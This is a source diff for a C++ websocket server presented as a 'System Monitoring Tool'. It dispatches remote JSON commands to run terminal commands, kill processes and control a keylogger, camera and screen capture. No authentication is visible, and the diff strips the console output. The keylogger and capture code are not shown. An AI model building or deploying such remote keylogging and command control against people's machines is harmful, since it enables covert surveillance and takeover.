@@ -1,3 +1,22 @@
+/*
+ * cpp-websocket - System Monitoring Tool
+ * Copyright (C) 2025 pnthuc and contributors
+ *
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program.  If not, see <https://www.gnu.org/licenses/>.
+ */
+
+#include "global.h"
 #include "screenshot.h"
 #include "keylogger.h"
 #include "list_app.h"
@@ -9,15 +28,6 @@
 #include "terminal.h"
 #include "announce.h"
 
-using tcp = boost::asio::ip::tcp;
-namespace websocket = boost::beast::websocket;
-namespace beast = boost::beast;
-namespace net = boost::asio;
-namespace http = beast::http;
-using json = nlohmann::json;
-
-auto file_logger = spdlog::basic_logger_mt("file_logger", "logs/server_log.txt", true);
-
 void session(tcp::socket socket) {
     try {
         auto ws_ptr = std::make_shared<websocket::stream<tcp::socket>>(std::move(socket));
@@ -28,7 +38,6 @@ void session(tcp::socket socket) {
             ws_ptr->read(buffer);
             std::string msg = beast::buffers_to_string(buffer.data());
             file_logger->info("Received: {}", msg);
-            std::cout << "Received: " << msg << std::endl;
             json data = json::parse(msg);
             if (data.contains("terminal")) {
                 std::string command = data["terminal"];
@@ -83,45 +92,7 @@ void session(tcp::socket socket) {
                 stopScreen();
             }
             else if (data["command"] == "stop_process") {
-                try {
-                    if (!data.contains("pid")) {
-                        sendMsg(*ws_ptr, "text", "Error", "PID not provided.");
-                    } else {
-                        uint32_t pid = 0;
-                        bool pid_ok = false;
-
-                        if (data["pid"].is_number_integer()) {
-                            pid = data["pid"].get<uint32_t>();
-                            pid_ok = true;
-                        } else if (data["pid"].is_string()) {
-                            try {
-                                pid = static_cast<uint32_t>(std::stoul(data["pid"].get<std::string>()));
-                                pid_ok = true;
-                            } catch (...) {
-                                pid_ok = false;
-                            }
-                        }
-
-                        if (!pid_ok) {
-                            sendMsg(*ws_ptr, "text", "Error", "Invalid PID format or type.");
-                        } else {
-                            std::cout << "PID: " << pid << std::endl;
-                            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, static_cast<DWORD>(pid));
-                            if (hProcess == NULL)
-                                sendMsg(*ws_ptr, "text", "Error", "Failed to open process with PID " + std::to_string(pid));
-                            else {
-                                if (TerminateProcess(hProcess, 0))
-                                    sendMsg(*ws_ptr, "text", "Info", "Process with PID " + std::to_string(pid) + " terminated.");
-                                else
-                                    sendMsg(*ws_ptr, "text", "Error", "Failed to terminate process with PID " + std::to_string(pid));
-                                CloseHandle(hProcess);
-                            }
-                        }
-                    }
-                } catch (const std::exception& e) {
-                    file_logger->error("Error terminating process: {}", e.what());
-                    sendMsg(*ws_ptr, "text", "Error", std::string("Exception: ") + e.what());
-                }
+                handle_kill_process(data, *ws_ptr);
             }
             else {
                 sendMsg(*ws_ptr, "text", "Info", "Unknown command: " + msg);
@@ -130,13 +101,11 @@ void session(tcp::socket socket) {
     }
     catch (std::exception& e) {
         file_logger->error("Session error: {}", e.what());
-        std::cerr << "Session error: " << e.what() << "\n";
         key_log_stop();
         stopCamera();
         stopScreen();
     } catch (...) {
         file_logger->error("Session unknown error");
-        std::cerr << "Session unknown error\n";
         key_log_stop();
         stopCamera();
         stopScreen();
@@ -152,7 +121,6 @@ int main() {
         file_logger->info("Server running at ws://localhost:8080");
         
         std::thread(announce_once).detach();
-        std::cout << "Server running at ws://localhost:8080\n";
 
         for (;;) {
             tcp::socket socket(ioc);
